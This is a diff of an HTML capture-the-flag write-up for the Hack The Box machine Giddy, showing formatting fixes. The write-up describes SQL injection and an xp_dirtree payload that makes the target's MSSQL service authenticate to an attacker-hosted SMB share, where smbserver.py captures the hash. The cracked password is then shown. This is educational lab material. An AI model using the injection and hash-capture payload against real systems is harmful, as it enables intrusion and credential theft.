@@ -10,7 +10,7 @@ layout: default
     <a href="/">Home</a>
   </li>
   <p>
-  This machine is showing only 3 open ports which basically are only 2 http/s and 3389. Usage of PowerShell web access feature is enlighted. 
+  This machine is showing only 3 open ports which basically are only 2 http/s and 3389. Usage of PowerShell web access feature is enlighted. How you can obtain user credentials I will exemplify it in two very much the same way: using impacket built and using responder.
   </p>
 </ul>
 
@@ -61,7 +61,7 @@ Initial port scan show 3 open ports: 80,443 and 3389.
 						</div>
 </p>
 <div>
-Enumerate the website with gobuster
+Enumerate the website with gobuster</br>
 <i>gobuster -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.104</i>
 </div>
 <p>
@@ -88,8 +88,9 @@ Adding a quote after Product id we gel a SQL error
 						</div>
 </p>
 <div>
-So now we know the webpage is vulnerable, we have to run sqlmap against it Very handy reading: https://www.binarytides.com/sqlmap-hacking-tutorial/ and some clear examples how to test the existence of vulnerabilities: https://www.exploit-db.com/papers/12975 
-<i>sqlmap --eizard</i>
+So now we know the webpage is vulnerable, we have to run sqlmap against it.</br> Very handy reading: 
+<a href="https://www.binarytides.com/sqlmap-hacking-tutorial/">https://www.binarytides.com/sqlmap-hacking-tutorial/</a> and some clear examples how to test the existence of vulnerabilities: <a href="https://www.exploit-db.com/papers/12975">https://www.exploit-db.com/papers/12975 </a> 
+<i>sqlmap --wizard</i>
 </div>
 <p>
 						<div class="embed-container">
@@ -107,18 +108,19 @@ Users existing on the machine: stacy and administrator
 Now I needed one hour to figure it out that I need to trick the website to spit me some credentials for connectivity.
 Handy reading resource :
 
-https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478
-https://github.com/SecureAuthCorp/impacket
-
+<a href="https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478">https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478</a>
+</br>
+<a hef="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a>
+</br>
 
 It is possible to use xp_dirtree to get the Giddy MSSQL user to connect to an SMB share you host
 (using smbserver.py of Impacket) to get their credentials.
-
+</br>
 
 Run this command in firefox
 <i>http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1;EXEC%20master.sys.xp_dirtree%20%27\\10.10.13.190\myshare%27,1,1</i>
 
-while you already lunch impacket:
+while you already launch impacket:
 <i>smbserver.py -smb2support myshare /Impacket</i>
 
 </div>
@@ -135,7 +137,7 @@ Let’s crack the password with a common dictionary
 and after a while we got the stacy password: xNnWo6272k7x
 
 maybe I can do this also with responder (my precious :))
-here is a very good resource: https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/wendels-small-hacking-tricks-microsoft-sql-server-edition/
+here is a very good resource: <a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/wendels-small-hacking-tricks-microsoft-sql-server-edition/">https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/wendels-small-hacking-tricks-microsoft-sql-server-edition/</a>
 
 </div>
 <p>
@@ -199,26 +201,7 @@ start and stop unifi from web powershell
 <i>start-service "Ubiquiti UniFi Video"</i>
 
 </div>
-<p>
-						<div class="embed-container">
-							<img src="./resources/nmapscan.png" />
-						</div>
-</p>
-<div>
-text
-<i>command</i>
-</div>
-<p>
-						<div class="embed-container">
-							<img src="./resources/nmapscan.png" />
-						</div>
-</p>
-<div>
-text
-<i>command</i>
-</div>
-<p>
-</p>
+
 <div>
 I hope you enjoyed the write-up and didn't made you wasting time. Drop me a cup of coffee for Sundays (<a href="https://ko-fi.com/y2xhcmtrzw50"> https://ko-fi.com/y2xhcmtrzw50 </a>) or email me kryptoniteclark@protonmail.com 
 </div>
